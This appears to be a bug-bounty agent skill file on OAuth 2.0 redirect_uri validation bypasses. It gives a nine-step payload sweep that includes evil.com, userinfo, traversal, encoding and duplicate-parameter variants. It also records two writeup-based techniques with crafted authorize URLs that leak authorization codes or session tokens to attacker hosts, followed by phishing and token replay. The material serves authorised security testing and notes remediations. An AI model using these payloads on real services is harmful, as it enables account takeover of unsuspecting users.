---
name: oauth-redirect-uri-bypass-testing
description: OAuth 2.0 / OIDC `redirect_uri` validation bypass — exploiting an authorization server that validates the client-supplied `redirect_uri` with a loose check (prefix/substring match, regex, domain-suffix check) instead of an exact string match against the registered callback, letting an attacker redirect the authorization code (or token, in implicit flow) to attacker-controlled infrastructure. Use this during Phase 3 (Vulnerability Testing — Auth/OAuth flows) of bughunting-workflow on any `/oauth/authorize`, `/oauth2/authorize`, `/authorize`, or SSO login endpoint that accepts a `redirect_uri`/`redirect_url`/`return_to` parameter. Also trigger on mentions of redirect_uri bypass, OAuth authorization code theft, loose prefix match, path traversal in redirect_uri, or SSO callback validation bypass.
---

# OAuth 2.0 Redirect URI Validation Bypass

General technique library for breaking an authorization server's `redirect_uri` allowlist check to steal the authorization code (or access token) and take over the victim's account. Each dated entry below is a validated technique pulled from a real writeup — add new entries here (don't create a new skill) whenever a new writeup covers a *different* bypass mechanism than what's already recorded.

## Core theory

The OAuth/OIDC spec requires the authorization server to validate the client's `redirect_uri` against a pre-registered value **exactly** before redirecting the authorization code back to it. Almost every instance of this bug class is the server implementing that check *incorrectly*:

- **Prefix/startswith match** instead of exact match — `redirect_uri` just needs to *start with* the registered value.
- **Substring/contains match** — registered domain just needs to appear anywhere in the URI.
- **Regex match with an unescaped `.`** — `https://app\.example\.com` as a regex lets `https://appXexample.com` or subdomains through.
- **Domain-suffix match without a path/scheme anchor** — `example.com` matches `evil-example.com.attacker.net` or `example.com.attacker.net`.
- **Validated path is bypassable server-side** — the check passes on the registered path, but the app *itself* has an open-redirect or path-traversal-normalizable endpoint reachable under that same registered prefix, so the browser ends up somewhere else after the initial hop.

The payoff is always the same regardless of which bypass gets you there: the authorization code (classic/PKCE-less flow) or access token (implicit flow) lands in the query string/fragment of a URL the attacker's server receives — in `Referer` headers, access logs, or a JS beacon the attacker planted on that page. From there the attacker exchanges the leaked code for tokens (if no PKCE, or if PKCE's `code_verifier` was also captured) and is logged in as the victim.

## Trigger technique: systematic redirect_uri variant sweep

Don't just try one bypass and give up — run the full variant ladder against the authorize endpoint and watch which ones the server accepts (i.e. issues a 302 back to your URI rather than an error page):

1. **Baseline:** confirm the registered `redirect_uri` works as-is, capture the exact registered value.
2. **Complete domain substitution** (`redirect_uri=https://evil.com`) — almost always rejected; establishes the server does *some* validation.
3. **Subdomain injection** (`redirect_uri=https://analytics.platform.com.evil.com`, or `evil.analytics.platform.com` if you control a subdomain/can get a takeover) — tests for suffix-only matching.
4. **Path traversal after the registered path** (`redirect_uri=https://analytics.platform.com/auth/callback/../../redirect?url=https://evil.com`) — tests whether validation is prefix-based and whether the app has its own open-redirect utility reachable under that prefix that path traversal can reach.
5. **Path appending** (`redirect_uri=https://analytics.platform.com/auth/callback/../attacker` or `/auth/callback%2f..%2f..%2fevil`, or just `/auth/callback/anything`) — tests prefix-only matching without needing an internal open redirect.
6. **Userinfo/`@` trick** (`redirect_uri=https://analytics.platform.com@evil.com`) — tests naive `.startsWith()`/`.includes()` checks that don't parse the URL properly.
7. **Encoding variants** on every payload above — URL-encode the traversal/`@`/`?` characters (`%2e%2e%2f`, `%40`, `%3f`) in case the validator runs before decoding but the actual redirect runs after.
8. **Open redirect chaining** — if the app has *any* known open-redirect endpoint (see `open-redirect-testing`) reachable under the registered `redirect_uri`'s origin, combine it: register-prefix-valid `redirect_uri` that itself forwards to the open-redirect endpoint with an external target.
9. **Duplicate/polluted `redirect_uri` parameter** (`?redirect_uri=<legit>&...&redirect_uri=<evil>`) — tests whether the identity provider (Google/etc.) and the *application's own callback handler* parse the query string the same way. If the IdP's validation reads the *first* occurrence (sees only the legit value, approves) but the app's backend framework resolves duplicates to the *last* occurrence (uses the attacker's value when actually delivering the token), you've found a two-stage parsing disagreement rather than a validation-logic bug — same payoff, completely different root cause, and one automated redirect_uri scanners routinely miss because they only check what the IdP does, not what the app's own callback re-validates afterward.

For each variant that gets accepted (302 issued), confirm the code/token actually appears in the final `Location` header or URL fragment sent to the external domain — a redirect chain can still 404/error out downstream even after passing the initial validation check.

## Recorded techniques

### 1. Prefix-match validation + internal open-redirect utility → authorization code theft → ATO
Source: [How an OAuth 2.0 Redirect URI Bypass Led to Account Takeover and an $8,000 Bounty](https://medium.com/@t4nv1/how-an-oauth-2-0-redirect-uri-bypass-led-to-account-takeover-and-an-8-000-bounty-ad67ba4b0db6)

**Where:** an enterprise analytics platform's SSO/identity-provider authorization endpoint (`/oauth/v2/authorize`), specifically its `redirect_uri` parameter validation.

**Root cause:** the identity provider validated `redirect_uri` with a **loose domain-prefix match** rather than an exact URL match — any URI that *started with* the registered callback domain passed. The app additionally exposed an internal open-redirect utility (`/redirect?url=...`) reachable via path traversal from underneath the registered callback path.

**Exploit steps:**
1. Map the standard OAuth handshake first: client → `/oauth/v2/authorize?client_id=...&response_type=code&redirect_uri=https://analytics.platform.com/auth/callback` → IdP authenticates → 302 redirect back to the callback with `?code=...`.
2. Run the variant sweep from Trigger technique above. Complete domain substitution and subdomain injection were both rejected. Path traversal succeeded:
   ```
   GET /oauth/v2/authorize?client_id=analytics_app_id&response_type=code&redirect_uri=https://analytics.platform.com/auth/callback/../../redirect?url=https://attacker-controlled-domain.com
   ```
3. Because the URI *starts with* `https://analytics.platform.com/auth/callback`, the prefix check passed. The path traversal (`/../../`) then got normalized by the underlying router down to the app's own `/redirect` open-redirect utility, which forwarded the browser (with all query params preserved, including the freshly-issued `code`) to the attacker's domain:
   ```
   HTTP/1.1 302 Found
   Location: https://analytics.platform.com/auth/callback/../../redirect?url=https://attacker-controlled-domain.com&code=AUTH_CODE_LEAKED_67890
   ```
4. Victim completes the SSO login flow via a link/pretext containing the crafted `redirect_uri`; their browser follows the chain and the final hop lands on the attacker's server with `code=` in the query string, captured in the attacker's access logs.
5. Attacker exchanges the leaked `code` at the standard token endpoint using the legitimate `client_id`/`client_secret` (no PKCE in use) — completes login as the victim with zero credentials and no MFA prompt.

**Impact framing for report:** "Complete account compromise without user credentials or state manipulation" — full OAuth authorization-code theft leading to account takeover. Time to triage: 1 hour. Bounty: $8,000.

**Remediation cited:** enforce exact string matching on `redirect_uri` (no prefix/substring/regex leniency) and require PKCE (`code_verifier`/`code_challenge`) so a bare leaked `code` can't be exchanged without the original requester's secret.

**Generalize beyond this target:** whenever an authorize endpoint's `redirect_uri` accepts *anything starting with* the registered value, always check what's reachable under that prefix via path traversal, extra path segments, or an `@`/userinfo trick — a prefix-valid but attacker-steerable `redirect_uri` is functionally a full open redirect on the OAuth code itself. Cross-reference `open-redirect-testing` for the internal open-redirect discovery methodology (`/redirect?url=` style utilities are common on enterprise SaaS platforms) and `race-condition-testing` for a different OAuth account-linking bug class (TOCTOU on code consumption, not redirect_uri validation) that can chain with this one on the same SSO flow.

### 2. Duplicate-`redirect_uri` HPP + undocumented legacy override parameter → two-stage validation gap → session-token theft
Source: [Breaking Login with Google Without Touching Google: An OAuth Redirect_URI Account Takeover](https://freedium-mirror.cfd/https://medium.com/@t4nv1/breaking-login-with-google-without-touching-google-an-oauth-redirect-uri-account-takeover-f706e881e237)

**Where:** a SaaS platform's "Login with Google" flow (`huddleboard.io`), specifically the *application's own* backend callback handler that processes the authorization code returned by Google — not Google's own OAuth implementation, which is explicitly not the vulnerable component here (hence the article's "without touching Google" framing).

**Root cause:** this is a categorically different bug from entry #1's loose-prefix-match — here the validation logic on paper was fine; the failure was a **parsing disagreement between two independent parties reading the same query string**. Google (the identity provider) validated `redirect_uri` against the registered application and correctly saw only the first, legitimate occurrence. The application's *own* backend callback handler, however, accepted an additional, undocumented `redirect_uri` override parameter (leftover legacy code, apparently from an older OAuth client library supporting multiple clients) and — via classic HTTP Parameter Pollution — resolved a duplicate `redirect_uri` query parameter to its *last* occurrence rather than the first. Stage 1 (Google's own check) worked correctly; Stage 2 (the app re-validating that the token-delivery target still matches the authorization-initiation target) simply didn't exist at all.

**Exploit steps:**
1. Craft an authorization URL with the legitimate registered `redirect_uri` first, followed by a second `redirect_uri` parameter pointing at attacker infrastructure:
   ```
   https://huddleboard.io/oauth/authorize?response_type=code&client_id=482910337221&redirect_uri=https://huddleboard.io/auth/callback&scope=openid%20profile%20email&state=8f3ac1e0d9b7&redirect_uri=https://attacker-controlled.com/collect
   ```
2. Send the URL to a victim (phishing/social engineering) — the consent screen shown is Google's own legitimate screen with no visual sign of tampering, since Google only ever sees/validates the first `redirect_uri` occurrence.
3. Victim approves; Google redirects with the authorization code to the legitimate registered `huddleboard.io` callback, exactly as expected.
4. The application's backend exchanges the code server-side, but its callback handler's own parameter-parsing logic picks up the *second* (attacker) `redirect_uri` value from the original request and delivers the resulting session token there instead of back to the victim's browser.
5. Attacker receives the session token directly on their own listener and replays it as a cookie — full account takeover with zero further steps, no code-exchange race, no PKCE bypass needed (this flow apparently didn't use PKCE, or PKCE alone wouldn't have helped since the token delivery itself — not just the code — was misdirected).

**Impact framing:** rated **Critical** rather than just High specifically because zero victim suspicion is required beyond a single click, the entire exploitable failure is server-side (invisible to any client-side security control), and the attacker needs no pre-existing platform access at all. Triage timeline: reported day 0, triaged/escalated to Critical day 2, emergency mitigation (legacy override parameter disabled) day 4, permanent fix (exact-match redirect_uri binding + outright rejection of duplicate `redirect_uri` parameters) day 16, **$5,400 bounty** awarded day 21, public disclosure day 50 — a useful reference timeline for how fast a Critical OAuth finding typically moves through a mature program's process.

**Generalize beyond this target:** don't stop redirect_uri testing at what the *identity provider* accepts — always separately test what the *application's own callback handler* does with a duplicate/polluted `redirect_uri` parameter, since these are two independent validation surfaces and automated scanners that only fuzz against the IdP miss this entirely. Explicitly hunt for undocumented/legacy parameters via JS bundle analysis (cross-reference `hidden-parameter-discovery-testing`) or cached/older API documentation (Wayback Machine, cross-reference `recon-scanning-toolkit`'s CDX deep-dive) — a parameter "left over from an older OAuth client library" is exactly the kind of dead code this class of bug hides in. Cross-reference `http-parameter-pollution-testing` for the general duplicate-parameter-resolution-disagreement technique this borrows from, applied here specifically to the OAuth redirect surface rather than WAF/CSRF/price-validation bypass.

<!-- Add new recorded techniques below this line as new redirect_uri-bypass writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
